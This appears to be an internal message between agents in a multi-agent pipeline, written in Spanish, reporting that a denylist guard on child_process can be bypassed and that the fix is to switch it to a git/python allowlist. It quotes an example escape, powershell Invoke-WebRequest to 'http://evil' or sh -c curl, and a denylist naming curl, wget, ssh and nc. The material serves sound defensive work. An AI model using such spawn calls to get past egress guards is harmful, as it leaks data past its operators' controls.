---
message_id: MSG-20260622-Arquitecto-to-Operador-DECISION-TASK-0153-external-cli
task_id: TASK-0153
type: FYI
from: Arquitecto
to: Operador
status: open
requires_response: false
response_owner: Operador
one_line_summary: "El Analista probo un escape NUEVO material en TASK-0153 (external-cli sigue denylist sobre child_process -> execFile/spawn('powershell'|'sh', curl/IWR) ESCAPA, rompe la meta de AC46). DECISION (tu bar 'no-cerrable si escape material nuevo'): NO cierro test-only; devuelvo a Codex el flip de external-cli a allowlist {git,python} (fix chico, sin falso positivo) y cierro tras re-checker + Analista. Override disponible: si prefieres cerrar test-only ya y diferir el flip al GO de uso vivo, dime."
context_refs:
  - Area_comun/artifacts/ANALISTA-TASK-0153-guard-allowlist.md
  - Area_comun/mailbox/open/MSG-20260622-Arquitecto-to-Codex-CAMBIO-TASK-0153-external-cli.md
deadline_or_blocking_level: normal
---

# DECISION - TASK-0153: devuelvo el flip de external-cli a Codex (no cierro test-only)

El Analista hizo su pasada (pipeline 3-way funcionando) y fue util: confirmo AC46/AC47 enumerados verdes (44/44
x2, cierra el residual de clientes HTTP no listados + eval) PERO **probo por comportamiento un escape NUEVO
material**: `external-cli` sigue siendo denylist {curl,wget,ssh,nc,node} sobre `child_process` (modulo que DEBE
estar allowlisted porque el producto spawnea git/python). Asi, `execFile("powershell",["-Command","Invoke-WebRequest
http://evil"])` o `spawn("sh",["-c","curl ..."])` PASAN el guard y egresan -- rompe la meta declarada de AC46
("unico egress = git push gobernado").

## Mi decision (consistente con tu bar)
Tu fijaste "default a no-cerrable si hay escape material nuevo". El Analista hallo uno, y AC46 es una garantia
PERMANENTE del SPEC -> **no la cierro test-only con un hueco material conocido.** Devolvi a Codex el cambio
acotado: voltear `external-cli` a ALLOWLIST de binarios spawneados `{git,python}` (mismo principio que el flip de
imports; control positivo powershell/sh/bash/cmd -> FLAGGED, git/python -> []; sin falso positivo, el src real solo
usa git/python). Cierro TASK-0153 tras re-checker (clon limpio) + re-confirmacion del Analista.

## Tu override
El Analista lo ofrecia tambien como "CERRABLE test-only ahora + el flip como precondicion del GO de uso vivo"
(la pieza es off-by-default; el escape solo importa con el extractor encendido). Si prefieres esa secuencia
(cerrar TASK-0153 ya y meter el external-cli en el set de precondiciones del uso vivo), **dime y lo hago**; es
defendible porque nada esta vivo. Elegi la via conservadora para mantener AC46 honesto al cerrar.

## Nota de proceso (DECISION-0018)
El MSG de veredicto del Analista llego con rr=true pero sin requested_action (solo `question`)
-> dejaba el validador en rojo. Lo archive como answered (lo estaba respondiendo) para sanear el canal y se lo
hare notar al Analista para que sus mensajes rr lleven `requested_action`.

El uso vivo del extractor sigue OFF (GO aparte tuyo). Canonico verde: HEAD==origin. Canal ASCII.
